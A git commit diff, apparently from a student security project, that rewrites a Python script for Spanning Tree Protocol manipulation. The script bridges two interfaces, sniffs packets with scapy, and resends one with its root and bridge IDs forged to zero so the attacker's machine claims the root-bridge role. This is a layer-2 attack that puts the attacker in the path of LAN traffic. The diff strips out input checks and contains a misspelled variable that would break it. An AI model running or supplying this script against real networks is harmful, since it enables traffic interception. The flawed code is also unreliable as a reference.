a4c1c2ee28b78cc3ae87cea1611da4bc3ebcd922
Kevin-RN <k.r.nanhekhan@student.tudelft.nl>
2022-02-18 16:55:58 +0100

    Update run_stp.py

--- data_link_layer/stp_manipulation/run_stp.py
+++ data_link_layer/stp_manipulation/run_stp.py
@@ -1,19 +1,30 @@
 import sys
+import subprocess
+from scapy.all import *
 
 if __name__ == "__main__":
-    # Check if all arguments are provided.
-    if len(sys.argv) != 5:
-       print("Incorrect number of arguments provided")
-       exit(1)
-
     fst_interface = str(sys.argv[1])
     snd_interface = str(sys.argv[2])
     bridge_id = str(sys.argv[3])
-    bridge_priority = int(sys.argv[4])
-	
-    # Check if bridge ID matches MAC address format.
-    regex_mac = "(?:[0-9a-fA-F]:?){12}"
-    if not re.match(regex_mac, mac_address.lower()):
-        print("Provided bridge ID ", mac_address," is in incorrect format")
-        exit(1)
-        
+    bridge_priority = str(sys.argv[4])
+
+    # Create bridge br0 and link the interfaces and set priority.
+    subprocess.call(['brctl', 'addbr', 'br0'])
+    subprocess.call(['brctl', 'addif', 'br0', fst_interface])
+    subprocess.call(['brctl', 'addif', 'br0', snd_interface])
+    subprocess.call(['brctl', 'setbridgeprio', 'br0', bridge_priority])
+    subprocess.call(['ip', 'link', 'set', 'dev', 'br0', 'up'])
+    subprocess.call(['brctl', 'stp', 'br0', 'on'])
+
+    # Sniff packets send from the interfaces (doesn't matter which one as they are both sent over the bridge).
+    packet = sniff(count=5, iface=[fst_interface, snd_interace])
+    # Modify the packet.
+    packet[4].rootid=0
+    packet[4].rootmac=bridge_id
+    packet[4].bridgeid=0
+    packet[4].bridgemac=bridge_id 
+    # Send packet back into the network.
+    sendp(packet[4], loop=0, verbose=0)
+
+
+
